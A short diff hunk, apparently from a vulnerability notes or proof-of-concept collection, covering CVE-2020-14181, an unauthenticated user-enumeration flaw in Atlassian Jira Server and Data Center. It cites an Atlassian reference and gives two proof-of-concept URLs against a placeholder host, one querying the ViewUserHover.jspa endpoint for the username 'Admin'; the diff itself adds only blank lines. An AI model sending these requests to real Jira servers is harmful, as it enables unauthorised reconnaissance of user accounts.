@@ -55,6 +55,8 @@ Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate
 Ref=https://jira.atlassian.com/browse/JRASERVER-71560?jql=text%20~%20%22cve-2020-14181%22
  POC:
 https://victomhost/secure/ViewUserHover.jspa
+
+
 https://victomhost/ViewUserHover.jspa?username=Admin
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
